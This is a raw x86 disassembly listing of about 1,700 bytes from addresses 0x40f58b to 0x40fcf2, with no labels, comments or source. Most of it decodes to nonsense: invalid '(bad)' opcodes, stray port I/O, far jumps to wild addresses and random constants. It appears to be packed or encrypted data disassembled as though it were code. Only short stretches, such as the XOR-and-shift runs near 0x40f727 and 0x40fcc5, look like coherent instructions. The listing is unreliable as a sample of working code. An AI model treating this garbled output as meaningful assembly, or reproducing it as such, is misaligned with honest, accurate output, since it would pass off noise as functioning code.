  40f58b:	push   0x5d
  40f58d:	inc    eax
  40f58e:	jmp    0x40f57d
  40f590:	test   BYTE PTR [edi-0x65],dh
  40f593:	jo     0x40f60f
  40f595:	repz pop esi
  40f597:	les    ebx,FWORD PTR ds:0xc3ae6e6e
  40f59d:	mov    esi,DWORD PTR [esi-0x37f18884]
  40f5a3:	xchg   DWORD PTR [eax],esp
  40f5a5:	sti    
  40f5a6:	inc    eax
  40f5a7:	retf   
  40f5a8:	retf   0xd8fe
  40f5ab:	sbb    dh,BYTE PTR [eiz*8-0x6e6ae28e]
  40f5b2:	dec    esi
  40f5b3:	imul   ecx,ebx,0x69e6d6dd
  40f5b9:	dec    ebx
  40f5ba:	daa    
  40f5bb:	push   eax
  40f5bc:	jp     0x40f550
  40f5be:	mov    bh,0xbf
  40f5c0:	cdq    
  40f5c1:	(bad)  
  40f5c2:	gs cmp al,0x28
  40f5c5:	xbegin 0xfe659f60
  40f5cb:	lods   al,BYTE PTR ds:[esi]
  40f5cc:	cdq    
  40f5cd:	pusha  
  40f5ce:	sub    eax,0xc1986774
  40f5d3:	ror    DWORD PTR [esi-0x27],cl
  40f5d6:	pop    esi
  40f5d7:	pop    ebp
  40f5d8:	stos   DWORD PTR es:[edi],eax
  40f5d9:	pop    edi
  40f5da:	jl     0x40f606
  40f5dc:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40f5de:	push   ecx
  40f5df:	jmp    0x40f5b3
  40f5e1:	data16 mov bl,0x2b
  40f5e4:	rcl    DWORD PTR [esi+0x6e],1
  40f5e7:	stos   DWORD PTR es:[edi],eax
  40f5e8:	jbe    0x40f5a8
  40f5ea:	test   al,0x70
  40f5ec:	das    
  40f5ed:	mov    esp,0x196b8049
  40f5f2:	aam    0x48
  40f5f4:	sub    al,0xd5
  40f5f6:	out    0x2f,eax
  40f5f8:	or     bh,BYTE PTR [esi+0x50297f68]
  40f5fe:	das    
  40f5ff:	mov    esp,0x6d9f673a
  40f604:	add    edx,DWORD PTR [edx+0x73303036]
  40f60a:	inc    esp
  40f60b:	push   0x85ad96cc
  40f610:	add    dh,BYTE PTR [edx]
  40f612:	adc    DWORD PTR [edi-0x76a14f2e],0xffffffb5
  40f619:	(bad)  
  40f61a:	pop    esp
  40f61b:	cmp    eax,0x399c8197
  40f620:	xor    eax,0x34b96ab6
  40f625:	and    BYTE PTR ds:0x5ce411d2,dh
  40f62b:	cwde   
  40f62c:	push   ss
  40f62d:	enter  0xedaa,0x56
  40f631:	(bad)  
  40f632:	mov    ebp,0x6154d6f6
  40f637:	xchg   esp,eax
  40f638:	inc    ebx
  40f639:	stos   DWORD PTR es:[edi],eax
  40f63a:	icebp  
  40f63b:	out    0x4a,al
  40f63d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f63e:	out    dx,eax
  40f63f:	adc    ch,BYTE PTR [esp+ebx*1+0x7ed9a286]
  40f646:	xchg   ebp,eax
  40f647:	jns    0x40f61a
  40f649:	cmp    DWORD PTR [edx-0x35],edi
  40f64c:	nop
  40f64d:	jp     0x40f618
  40f64f:	inc    edi
  40f650:	mov    edx,0x4cb9a9a1
  40f655:	fimul  DWORD PTR [esp+ebp*4-0x3d]
  40f659:	cli    
  40f65a:	sub    esp,DWORD PTR [esi]
  40f65c:	stos   BYTE PTR es:[edi],al
  40f65d:	out    0xd3,al
  40f65f:	pushf  
  40f660:	push   es
  40f661:	xchg   edx,eax
  40f662:	ss mov dh,ah
  40f665:	push   ss
  40f666:	xchg   ebp,eax
  40f667:	jge    0x40f655
  40f669:	sub    eax,0x6066c768
  40f66e:	push   es
  40f66f:	add    BYTE PTR gs:[edi-0x37cfc8a1],dl
  40f676:	add    eax,0xf9b964c0
  40f67b:	shl    DWORD PTR [eax-0x14],0x31
  40f67f:	and    DWORD PTR [ecx+0x2f1c57d8],eax
  40f685:	imul   esp,DWORD PTR [esi],0xffffffe5
  40f688:	fisttp WORD PTR [esp+eax*1+0x6b41b0dd]
  40f68f:	inc    ebp
  40f690:	aaa    
  40f691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f692:	dec    esi
  40f693:	push   edx
  40f694:	inc    ebp
  40f695:	lds    edi,FWORD PTR [eax]
  40f697:	lods   eax,DWORD PTR ds:[esi]
  40f698:	pop    esp
  40f699:	mov    ebp,0x9989d85d
  40f69e:	aam    0xd1
  40f6a0:	sub    BYTE PTR [esi*2+0x76061a78],al
  40f6a7:	adc    DWORD PTR [edi+0x2f],edi
  40f6aa:	pop    ss
  40f6ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6ac:	add    DWORD PTR [ebx+0x1e5c0d86],ecx
  40f6b2:	xchg   esp,eax
  40f6b3:	dec    ebp
  40f6b4:	sahf   
  40f6b5:	add    cl,BYTE PTR [ecx]
  40f6b7:	push   0xd04f09d7
  40f6bc:	jmp    0x2c494ad3
  40f6c1:	mov    cl,0xda
  40f6c3:	cmp    eax,esi
  40f6c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6c6:	mov    ah,0x4a
  40f6c8:	adc    BYTE PTR fs:[ecx+0x771cdc79],0xbe
  40f6d0:	push   ds
  40f6d1:	sub    DWORD PTR [ecx],edx
  40f6d3:	jo     0x40f6c9
  40f6d5:	test   eax,0xbd8a5ec1
  40f6da:	jns    0x40f72b
  40f6dc:	fild   WORD PTR [eax+0x60ea4d62]
  40f6e2:	adc    BYTE PTR [edx-0x2e87a96d],dh
  40f6e8:	pop    ebx
  40f6e9:	push   es
  40f6ea:	retf   0xca42
  40f6ed:	retf   
  40f6ee:	cld    
  40f6ef:	repz sbb ebx,ebp
  40f6f2:	daa    
  40f6f3:	shl    BYTE PTR [edi],0xde
  40f6f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6f7:	mov    cl,0x22
  40f6f9:	cdq    
  40f6fa:	scas   al,BYTE PTR es:[edi]
  40f6fb:	mov    ecx,0xdb41385b
  40f700:	imul   esp,DWORD PTR [ebx+0x4e6978d7],0xa17b6ead
  40f70a:	js     0x40f787
  40f70c:	xchg   esp,eax
  40f70d:	cmp    ecx,esp
  40f70f:	aaa    
  40f710:	rcl    DWORD PTR [ecx+0x63],0xcb
  40f714:	jecxz  0x40f789
  40f716:	test   BYTE PTR [eax],0x5f
  40f719:	(bad)  
  40f71a:	fwait
  40f71b:	cmp    cl,BYTE PTR [esi-0x3c7cb46c]
  40f721:	sbb    BYTE PTR [ebx+0x4568b06],cl
  40f727:	shrd   eax,edx,0x2
  40f72b:	mov    DWORD PTR [ebp+0x14],eax
  40f72e:	mov    eax,DWORD PTR [esi]
  40f730:	xor    DWORD PTR [ebp+0x14],edi
  40f733:	shr    edx,0x2
  40f736:	mov    edx,DWORD PTR [esi+0x4]
  40f739:	jmp    0x40fcc3
  40f73e:	inc    edx
  40f73f:	jecxz  0x40f7be
  40f741:	sbb    bl,BYTE PTR [eax+ebx*1]
  40f744:	sub    bl,dl
  40f746:	mov    esi,0xaab40793
  40f74b:	mov    esi,0x74e272a8
  40f750:	push   ss
  40f751:	push   ss
  40f752:	cmp    eax,0x63161604
  40f757:	mov    edi,0x303adca7
  40f75c:	icebp  
  40f75d:	xchg   edx,eax
  40f75e:	pusha  
  40f75f:	sar    DWORD PTR [esi+0x59],0x82
  40f763:	xor    DWORD PTR [ebp-0x6cdaadb8],esi
  40f769:	xchg   DWORD PTR [ebp-0x68787256],edx
  40f76f:	outs   dx,BYTE PTR ds:[esi]
  40f770:	mov    WORD PTR [ecx+0x63],ds
  40f773:	add    DWORD PTR [edx],ebp
  40f775:	hlt    
  40f776:	je     0x40f7ba
  40f778:	popa   
  40f779:	pushf  
  40f77a:	retf   0x9144
  40f77d:	dec    eax
  40f77e:	gs sar bh,0xd
  40f782:	mov    eax,ds:0x37baf24a
  40f787:	pop    ds
  40f788:	test   al,0x1a
  40f78a:	pop    ss
  40f78b:	jns    0x40f7f3
  40f78d:	ins    BYTE PTR es:[edi],dx
  40f78e:	sbb    DWORD PTR [eax],esi
  40f790:	jge    0x40f811
  40f792:	cmp    al,0x5d
  40f794:	and    BYTE PTR [esi-0x1b648b96],bl
  40f79a:	dec    esp
  40f79b:	stos   DWORD PTR es:[edi],eax
  40f79c:	dec    edi
  40f79d:	nop
  40f79e:	xor    esi,DWORD PTR [eax+0x65]
  40f7a1:	in     eax,0x34
  40f7a3:	pop    edx
  40f7a4:	in     al,0xe8
  40f7a6:	xchg   ecx,eax
  40f7a7:	jmp    0x6b8c:0xa76070c7
  40f7ae:	ja     0x40f770
  40f7b0:	xor    esi,DWORD PTR [ecx+0x823eddc]
  40f7b6:	test   BYTE PTR [ecx-0x4c],bl
  40f7b9:	pusha  
  40f7ba:	pop    es
  40f7bb:	pop    DWORD PTR [ebx+0x0]
  40f7be:	add    al,0x6a
  40f7c0:	es pop esp
  40f7c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7c3:	test   al,0x12
  40f7c5:	test   DWORD PTR [ebx+edi*4],ebx
  40f7c8:	adc    eax,0xbd1c9bdb
  40f7cd:	xchg   edi,eax
  40f7ce:	int    0x2
  40f7d0:	lds    ecx,FWORD PTR [esi+esi*8+0x16]
  40f7d4:	push   ecx
  40f7d5:	add    al,0x3f
  40f7d7:	mov    ch,0xae
  40f7d9:	jg     0x40f7d1
  40f7db:	push   ss
  40f7dc:	or     DWORD PTR [ebp+edi*8+0xd],ebp
  40f7e0:	fistp  WORD PTR [esi]
  40f7e2:	mov    ebp,0x3204b989
  40f7e7:	cmp    esp,DWORD PTR [eax+0x6fd75aeb]
  40f7ed:	(bad)  [eax+0x52]
  40f7f0:	push   ebp
  40f7f1:	xchg   ebp,eax
  40f7f2:	dec    ebp
  40f7f3:	mov    dh,0x77
  40f7f5:	fld    TBYTE PTR [ebp+0x2f1799dd]
  40f7fb:	sub    ch,BYTE PTR [eax+0x2f525445]
  40f801:	add    edi,DWORD PTR ds:0xbd311f59
  40f807:	ror    DWORD PTR [esi+0x6ddc0be8],1
  40f80d:	test   eax,0x68733992
  40f812:	ret    0xa331
  40f815:	mov    ecx,0x98a407c9
  40f81a:	xchg   edi,eax
  40f81b:	addr16 call 0x74b3:0x9e0e13ae
  40f823:	rcl    DWORD PTR [ebp+0x48d971cb],cl
  40f829:	into   
  40f82a:	fld    QWORD PTR [ebx]
  40f82c:	or     DWORD PTR [eax],edi
  40f82e:	loopne 0x40f7bf
  40f830:	outs   dx,DWORD PTR ds:[esi]
  40f831:	adc    ebx,DWORD PTR [ecx-0x57]
  40f834:	fbld   TBYTE PTR [ecx-0x77]
  40f837:	add    DWORD PTR [ecx],0x19
  40f83a:	mov    DWORD PTR ds:0xc390b502,esp
  40f840:	test   bh,0x88
  40f843:	jo     0x40f7f5
  40f845:	jnp    0x40f7ea
  40f847:	in     eax,dx
  40f848:	jbe    0x40f846
  40f84a:	mov    dl,0x26
  40f84c:	mov    es,WORD PTR [esi+0xb]
  40f84f:	sub    eax,DWORD PTR [ebx+0x3d]
  40f852:	popa   
  40f853:	jnp    0x40f8bb
  40f855:	pop    ecx
  40f856:	daa    
  40f857:	cdq    
  40f858:	dec    DWORD PTR [ecx-0x33556f29]
  40f85e:	into   
  40f85f:	mov    ch,BYTE PTR [edx]
  40f861:	and    edi,DWORD PTR [edx]
  40f863:	lds    esi,FWORD PTR [edx-0x5006cf0f]
  40f869:	outs   dx,BYTE PTR ds:[esi]
  40f86a:	lock jbe 0x40f8c6
  40f86d:	xchg   edx,eax
  40f86e:	jb     0x40f8bd
  40f870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f871:	ins    DWORD PTR es:[edi],dx
  40f872:	ss jb  0x40f87c
  40f875:	jo     0x40f8a4
  40f877:	sub    al,0xa3
  40f879:	test   al,0xe7
  40f87b:	cmp    BYTE PTR [esi-0x74],dh
  40f87e:	jmp    0xec977c83
  40f883:	xor    DWORD PTR [ebx-0x72be9865],esi
  40f889:	outs   dx,BYTE PTR ds:[esi]
  40f88a:	cmp    BYTE PTR cs:[esi+0x2a80dd3a],bh
  40f891:	cmp    BYTE PTR [ebx],cl
  40f893:	ret    0x1c3b
  40f896:	and    ecx,DWORD PTR [edi+0x6be9845e]
  40f89c:	jns    0x40f896
  40f89e:	imul   esi,edx,0xfffffff0
  40f8a1:	or     esp,DWORD PTR [edx]
  40f8a3:	or     bh,bl
  40f8a5:	nop
  40f8a6:	dec    ebp
  40f8a7:	pusha  
  40f8a8:	or     BYTE PTR [ebx-0x17],cl
  40f8ab:	mov    ch,0xcc
  40f8ad:	dec    ebx
  40f8ae:	mov    edx,0x9f831eaf
  40f8b3:	add    BYTE PTR [edx],ah
  40f8b5:	pop    ss
  40f8b6:	imul   ebp,DWORD PTR [esi-0x61],0x1246505
  40f8bd:	sub    edx,0xe0d650c5
  40f8c3:	dec    ecx
  40f8c4:	(bad)  
  40f8c5:	xchg   ecx,eax
  40f8c6:	data16 lahf 
  40f8c8:	imul   ebp,DWORD PTR [edx],0x50
  40f8cb:	es or  eax,0xd551d688
  40f8d1:	push   ss
  40f8d2:	push   eax
  40f8d3:	in     al,dx
  40f8d4:	sub    ebp,DWORD PTR [eax+0x7d]
  40f8d7:	fimul  DWORD PTR [edx-0x6e]
  40f8da:	ret    0xb997
  40f8dd:	lods   eax,DWORD PTR ds:[esi]
  40f8de:	add    BYTE PTR [edx+0x4f89a6d6],ch
  40f8e4:	cdq    
  40f8e5:	neg    BYTE PTR [edi+0x43]
  40f8e8:	jmp    0x48b0a1da
  40f8ed:	sahf   
  40f8ee:	add    al,0x8e
  40f8f0:	test   BYTE PTR [ecx-0x4a4c98ef],ch
  40f8f6:	ins    DWORD PTR es:[edi],dx
  40f8f7:	clc    
  40f8f8:	or     dh,BYTE PTR [ebx+esi*2-0x418fe081]
  40f8ff:	mov    es,WORD PTR [ebx-0x5d]
  40f902:	mov    edx,0xc8948ade
  40f908:	not    BYTE PTR [ecx]
  40f90a:	lock sar dl,cl
  40f90d:	xor    BYTE PTR [esp+esi*2-0x41],ah
  40f911:	int    0x55
  40f913:	inc    ebp
  40f914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f915:	pop    esp
  40f916:	mov    ecx,0xf1ee2f6d
  40f91b:	mov    al,BYTE PTR [edi]
  40f91d:	xor    edi,DWORD PTR [ebx+0x35222a55]
  40f923:	inc    ebx
  40f924:	outs   dx,DWORD PTR ds:[esi]
  40f925:	outs   dx,DWORD PTR ds:[esi]
  40f926:	stos   DWORD PTR es:[edi],eax
  40f927:	or     eax,DWORD PTR [eax-0x496f0f97]
  40f92d:	lds    eax,FWORD PTR [eax-0x1959d0f8]
  40f933:	add    ebp,DWORD PTR [esi+0x7]
  40f936:	shl    BYTE PTR [eax-0x3ec7196],cl
  40f93c:	xor    ch,dl
  40f93e:	(bad)  
  40f93f:	mov    edx,0x4f6b73ff
  40f944:	test   al,0x1a
  40f946:	sbb    BYTE PTR [ebx+esi*2],bl
  40f949:	add    BYTE PTR [edi+0x6da2ea],dh
  40f94f:	cmc    
  40f950:	lea    esi,[esi+0x71]
  40f953:	data16 setb BYTE PTR [ebx-0x70a8f15a]
  40f95b:	xchg   edx,eax
  40f95c:	mov    ebx,0x98802c96
  40f961:	test   DWORD PTR [eax+ebp*2+0x60],0x1548c04f
  40f969:	stc    
  40f96a:	mov    ds:0xb271afa4,al
  40f96f:	or     al,0x4d
  40f971:	mov    esi,esi
  40f973:	out    dx,eax
  40f974:	xchg   edx,eax
  40f975:	jg     0x40f987
  40f977:	arpl   WORD PTR [edx+0x2f],bx
  40f97a:	mov    esi,0xef950287
  40f97f:	ret    
  40f980:	pop    ds
  40f981:	sahf   
  40f982:	(bad)  
  40f983:	xchg   edx,eax
  40f984:	push   esp
  40f985:	jb     0x40f94d
  40f987:	inc    si
  40f989:	push   ds
  40f98a:	sbb    eax,0x7e34dc53
  40f98f:	or     ecx,eax
  40f991:	aam    0x85
  40f993:	gs pop ss
  40f995:	jp     0x40f977
  40f997:	das    
  40f998:	loope  0x40f940
  40f99a:	cmc    
  40f99b:	mov    edx,0xbf108164
  40f9a0:	clc    
  40f9a1:	xor    esp,ebx
  40f9a3:	daa    
  40f9a4:	mov    al,ds:0x2f91dfcb
  40f9a9:	adc    DWORD PTR ds:0x5197cab5,0xffffff80
  40f9b0:	add    al,0x39
  40f9b2:	xlat   BYTE PTR ds:[ebx]
  40f9b3:	ins    DWORD PTR es:[edi],dx
  40f9b4:	inc    esp
  40f9b5:	mov    esi,0x3d3e6ed5
  40f9ba:	xchg   BYTE PTR [eax+eax*8+0x5f],bl
  40f9be:	cmp    eax,0x6ba5b5f3
  40f9c3:	std    
  40f9c4:	fnsave [edx]
  40f9c6:	xchg   esp,eax
  40f9c7:	neg    BYTE PTR [edx+edx*1-0x134f3192]
  40f9ce:	and    BYTE PTR [edi+0x1d73fa2a],0x40
  40f9d5:	pop    ebp
  40f9d6:	scas   al,BYTE PTR es:[edi]
  40f9d7:	je     0x40f9c1
  40f9d9:	pop    ebx
  40f9da:	es mov cl,0x7c
  40f9dd:	push   es
  40f9de:	(bad)  
  40f9df:	jns    0x40f9a4
  40f9e1:	mov    ch,0x8f
  40f9e3:	ror    BYTE PTR [edi+0x18],0xf1
  40f9e7:	js     0x40fa46
  40f9e9:	sbb    DWORD PTR [eax+0x6b14d3d1],edx
  40f9ef:	shl    BYTE PTR [edx+esi*4+0x50],1
  40f9f3:	in     al,0x1d
  40f9f5:	in     eax,0x7b
  40f9f7:	sub    al,0xd1
  40f9f9:	xchg   edx,eax
  40f9fa:	sbb    edi,DWORD PTR [ebp+0x41]
  40f9fd:	clc    
  40f9fe:	dec    ebx
  40f9ff:	add    ebx,DWORD PTR ds:0x62aeb99d
  40fa05:	jg     0x40f99d
  40fa07:	fdivr  st,st(6)
  40fa09:	cs lea ebp,cs:[eax]
  40fa0d:	xor    DWORD PTR [edi+ebx*1],edx
  40fa10:	inc    esp
  40fa11:	jo     0x40f9d8
  40fa13:	mov    cl,0xb7
  40fa16:	call   0x846f470a
  40fa1b:	dec    ebp
  40fa1c:	aam    0xc0
  40fa1e:	jb     0x40fa75
  40fa20:	dec    esp
  40fa21:	icebp  
  40fa22:	mov    dh,0x78
  40fa24:	mov    esi,0x21068354
  40fa29:	push   cs
  40fa2a:	in     al,0x9f
  40fa2c:	push   0x21876a83
  40fa31:	out    dx,al
  40fa32:	mov    ah,0x67
  40fa34:	mov    esp,DWORD PTR [edi]
  40fa36:	adc    al,ah
  40fa38:	dec    ecx
  40fa39:	mov    ebp,0xf0933122
  40fa3e:	and    dh,BYTE PTR [ebx+ebp*8]
  40fa41:	cwde   
  40fa42:	mov    al,ds:0x35056ee9
  40fa47:	push   ds
  40fa48:	xor    eax,0x9591b260
  40fa4d:	jo     0x40fa92
  40fa4f:	repnz imul DWORD PTR [edx-0x3d]
  40fa53:	or     al,0x13
  40fa55:	std    
  40fa56:	cmp    al,0x7
  40fa58:	push   cs
  40fa59:	mov    eax,0x5a31f101
  40fa5e:	mov    dl,0x53
  40fa60:	ror    DWORD PTR [eax-0x69],0x88
  40fa64:	imul   ebp,edx,0x40
  40fa67:	sub    eax,0xafb04f0
  40fa6c:	daa    
  40fa6d:	pop    esp
  40fa6e:	mov    ebp,0xe1f9f263
  40fa73:	retf   
  40fa74:	pop    ss
  40fa75:	jmp    0x40fa07
  40fa77:	pop    ebx
  40fa78:	add    al,0xf3
  40fa7a:	and    DWORD PTR [edx-0x56439557],esp
  40fa80:	test   eax,0xaaf8b941
  40fa85:	cdq    
  40fa86:	sbb    al,0xf0
  40fa88:	test   eax,0x11ad15be
  40fa8d:	mov    ecx,DWORD PTR [ecx]
  40fa8f:	push   ebx
  40fa90:	test   eax,0x7c749a1a
  40fa95:	and    ch,dl
  40fa97:	icebp  
  40fa98:	xchg   edi,eax
  40fa99:	cmp    BYTE PTR [edx+0xe06eff3],dl
  40fa9f:	push   0x1
  40faa1:	adc    BYTE PTR [ecx-0xcdc9ee4],dh
  40faa7:	mov    bh,0xd1
  40faa9:	xchg   esp,eax
  40faaa:	dec    ebp
  40faab:	sub    eax,0xfd0cee70
  40fab0:	pop    es
  40fab1:	mov    WORD PTR [eax+0x44],gs
  40fab4:	mov    DWORD PTR [edi-0x2dd6fa81],eax
  40faba:	xchg   edx,eax
  40fabb:	popa   
  40fabc:	and    dl,BYTE PTR [ebx-0x44ae2f56]
  40fac2:	mov    fs,WORD PTR [esi+0x24fdb02b]
  40fac8:	dec    ecx
  40fac9:	clc    
  40faca:	retf   
  40facb:	cdq    
  40facc:	pop    edi
  40facd:	pop    dx
  40facf:	outs   dx,DWORD PTR es:[esi]
  40fad1:	mov    eax,ds:0x199a6c48
  40fad6:	std    
  40fad7:	xchg   DWORD PTR [edx],ebp
  40fad9:	clc    
  40fada:	or     al,ah
  40fadc:	ins    BYTE PTR es:[edi],dx
  40fadd:	jnp    0x40fae0
  40fadf:	mov    ah,0x6a
  40fae1:	inc    esi
  40fae2:	mov    esp,0x5e2a6a91
  40fae7:	ret    0xda3f
  40faea:	mov    bl,0xb0
  40faec:	add    eax,0x32f8e53d
  40faf1:	push   cs
  40faf2:	scas   al,BYTE PTR es:[edi]
  40faf3:	mov    dl,0x9c
  40faf5:	pop    es
  40faf6:	test   DWORD PTR [eax],edx
  40faf8:	pop    ebp
  40faf9:	mov    esi,0xc46577b5
  40fafe:	sbb    eax,0x718177f4
  40fb03:	mov    ah,0x7e
  40fb05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb06:	out    0x46,al
  40fb08:	fld    TBYTE PTR [ebp-0x5c]
  40fb0b:	jmp    0x40fb06
  40fb0d:	and    BYTE PTR [edx+0x1c2a2c0b],dl
  40fb13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb14:	fcomp  DWORD PTR [eax-0x3c]
  40fb17:	das    
  40fb18:	push   ecx
  40fb19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb1a:	jg     0x40fb3b
  40fb1c:	add    al,0xe5
  40fb1e:	xchg   esp,eax
  40fb1f:	inc    ebx
  40fb20:	and    DWORD PTR [esi-0x5644cb1f],esp
  40fb26:	shl    DWORD PTR [eax],cl
  40fb28:	mov    esp,0x9c78a989
  40fb2d:	sti    
  40fb2e:	nop
  40fb2f:	inc    eax
  40fb30:	or     esp,edx
  40fb32:	cmp    BYTE PTR [edi-0x7e84bd2b],ah
  40fb38:	pop    ds
  40fb39:	mov    ebp,0x20da8b95
  40fb3e:	or     esi,DWORD PTR [esi-0x45]
  40fb41:	popa   
  40fb42:	enter  0x200a,0x8a
  40fb46:	xor    eax,0x3eb98cc5
  40fb4b:	inc    ebp
  40fb4c:	jo     0x40fb29
  40fb4e:	mov    ecx,0x9788253d
  40fb53:	dec    ecx
  40fb54:	call   0xf7ab6c01
  40fb59:	fisubr WORD PTR [ebx+0x30]
  40fb5c:	push   esp
  40fb5d:	xchg   ecx,eax
  40fb5e:	mov    esi,0x3b906f13
  40fb63:	test   ebx,ebp
  40fb65:	and    ah,BYTE PTR [esi+0xb]
  40fb68:	lahf   
  40fb69:	lock ror BYTE PTR [edx],1
  40fb6c:	es stos BYTE PTR es:[edi],al
  40fb6e:	mov    ds:0xad37bff7,al
  40fb73:	mov    WORD PTR [eax],?
  40fb75:	mov    bl,bl
  40fb77:	cmp    BYTE PTR [esp+edi*4-0xc6cc559],cl
  40fb7e:	cmp    eax,0xea976607
  40fb83:	cmp    al,0x88
  40fb85:	pushf  
  40fb86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb87:	iret   
  40fb88:	mul    edx
  40fb8a:	dec    esi
  40fb8b:	std    
  40fb8c:	sti    
  40fb8d:	out    0x13,eax
  40fb8f:	cmp    eax,0xcb957f6
  40fb94:	push   0x5d77c0a2
  40fb99:	jnp    0x40fb3c
  40fb9b:	fbstp  TBYTE PTR [eax+edx*2+0x53eaa27b]
  40fba2:	sbb    BYTE PTR [edi-0x59],0x99
  40fba6:	out    0xda,eax
  40fba8:	sub    esp,DWORD PTR [ecx-0x12241015]
  40fbae:	sbb    ebp,esi
  40fbb0:	mov    eax,0xc774c147
  40fbb5:	xchg   ebx,eax
  40fbb6:	sti    
  40fbb7:	(bad)  
  40fbb8:	sti    
  40fbb9:	stos   DWORD PTR es:[edi],eax
  40fbba:	xor    al,0xeb
  40fbbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbbd:	sub    edx,ebx
  40fbbf:	loopne 0x40fbf1
  40fbc1:	popf   
  40fbc2:	aam    0x28
  40fbc4:	ror    BYTE PTR [eax+0x7],cl
  40fbc7:	push   ebp
  40fbc8:	or     BYTE PTR [ebx+ecx*2+0x2abad71b],al
  40fbcf:	sbb    dl,BYTE PTR [eax-0x1c01cff7]
  40fbd5:	clc    
  40fbd6:	mov    DWORD PTR [eax],ebp
  40fbd8:	and    al,0x7d
  40fbda:	xchg   ebp,eax
  40fbdb:	xor    DWORD PTR [ecx+0xdaf088d],ecx
  40fbe1:	sbb    al,0x7e
  40fbe3:	fstp   DWORD PTR [edi+ebp*4]
  40fbe6:	in     al,dx
  40fbe7:	ret    
  40fbe8:	jns    0x40fc2e
  40fbea:	add    esi,0x4cee0cff
  40fbf0:	mov    dh,0x45
  40fbf2:	fbld   TBYTE PTR [edx-0x5a]
  40fbf5:	pop    ds
  40fbf6:	test   eax,0x7eb6ab66
  40fbfb:	ins    BYTE PTR es:[edi],dx
  40fbfc:	test   al,0xa6
  40fbfe:	cmp    cl,0x17
  40fc01:	outs   dx,DWORD PTR ds:[esi]
  40fc02:	xchg   BYTE PTR [ecx],dh
  40fc04:	ins    DWORD PTR es:[edi],dx
  40fc05:	data16 into 
  40fc07:	icebp  
  40fc08:	and    bh,BYTE PTR [esp+ebp*8]
  40fc0b:	lods   eax,DWORD PTR ds:[esi]
  40fc0c:	lea    ebp,[ebp+0x16]
  40fc0f:	out    dx,eax
  40fc10:	xor    eax,ebx
  40fc12:	xlat   BYTE PTR ds:[ebx]
  40fc13:	or     BYTE PTR [ecx],dl
  40fc15:	or     edi,edi
  40fc17:	sbb    al,ch
  40fc19:	fadd   QWORD PTR [edi-0x4678c8bb]
  40fc1f:	in     al,0xf3
  40fc21:	jl     0x40fc26
  40fc23:	sub    esi,DWORD PTR [ecx-0x2f74f377]
  40fc29:	rcr    BYTE PTR [edi+0x26],cl
  40fc2c:	sbb    al,0x90
  40fc2e:	adc    al,0xd7
  40fc30:	sbb    ebx,ecx
  40fc32:	sub    bh,cl
  40fc34:	lahf   
  40fc35:	arpl   ax,si
  40fc37:	outs   dx,DWORD PTR ds:[esi]
  40fc38:	push   edi
  40fc39:	xor    ebp,DWORD PTR [ebp-0x53]
  40fc3c:	sub    bh,ch
  40fc3e:	popf   
  40fc3f:	js     0x40fc36
  40fc41:	pop    edx
  40fc42:	ror    cl,0x3d
  40fc45:	inc    edi
  40fc46:	into   
  40fc47:	push   es
  40fc48:	adc    bl,BYTE PTR [ecx]
  40fc4a:	scas   al,BYTE PTR es:[edi]
  40fc4b:	rol    DWORD PTR [edi+0x6adcabc1],cl
  40fc51:	imul   edx,DWORD PTR [ebx+0x3aba1b59],0xa9f682dc
  40fc5b:	jmp    0xe1547e84
  40fc60:	xchg   DWORD PTR [esi],ebx
  40fc62:	retf   
  40fc63:	dec    edi
  40fc64:	gs adc cl,al
  40fc67:	push   esi
  40fc68:	aad    0x27
  40fc6a:	mov    cl,BYTE PTR [ebx]
  40fc6c:	and    BYTE PTR [ebp+0x49],ch
  40fc6f:	repz fwait
  40fc71:	popa   
  40fc72:	cs sbb al,0xe1
  40fc75:	push   cs
  40fc76:	scas   al,BYTE PTR es:[edi]
  40fc77:	scas   eax,DWORD PTR es:[edi]
  40fc78:	iret   
  40fc79:	sti    
  40fc7a:	int    0xb5
  40fc7c:	je     0x40fcb2
  40fc7e:	fucomp st(5)
  40fc80:	inc    edi
  40fc81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc82:	cmp    ah,bh
  40fc84:	jb     0x40fcce
  40fc86:	xor    ah,BYTE PTR [edi]
  40fc88:	mov    al,ds:0xb66b841c
  40fc8d:	mov    ah,0xc6
  40fc8f:	mov    al,0xb4
  40fc91:	into   
  40fc92:	mov    WORD PTR [esi-0x2d04e289],?
  40fc98:	adc    eax,0x490368a8
  40fc9d:	ret    0xba9
  40fca0:	adc    ebp,edi
  40fca2:	or     dh,BYTE PTR [eax+0x21]
  40fca5:	dec    edi
  40fca6:	mov    ds:0x11b1e2be,al
  40fcab:	inc    esp
  40fcac:	bound  esp,QWORD PTR [esi-0x769c8dd4]
  40fcb2:	paddb  mm6,QWORD PTR [esi+eiz*2+0x7fd3df2e]
  40fcba:	xor    eax,0xd6567336
  40fcbf:	cmc    
  40fcc0:	mov    al,ds:0xd233ff7f
  40fcc5:	shl    eax,0x1e
  40fcc8:	or     edx,DWORD PTR [ebp+0x14]
  40fccb:	mov    DWORD PTR [ebp-0x28],edx
  40fcce:	mov    eax,DWORD PTR [ebp-0x24]
  40fcd1:	mov    eax,DWORD PTR [ebp-0x24]
  40fcd4:	xor    edx,edx
  40fcd6:	shld   edx,eax,0x2
  40fcda:	xor    edx,ecx
  40fcdc:	mov    DWORD PTR [ebp+0xc],edx
  40fcdf:	mov    edx,DWORD PTR [esi]
  40fce1:	shl    eax,0x2
  40fce4:	mov    DWORD PTR [ebp+0x10],edx
  40fce7:	mov    edx,DWORD PTR [esi+0x4]
  40fcea:	xor    eax,0xba699573
  40fcef:	mov    DWORD PTR [ebp+0x14],edx
  40fcf2:	cmp    eax,DWORD PTR [ebp+0x10]
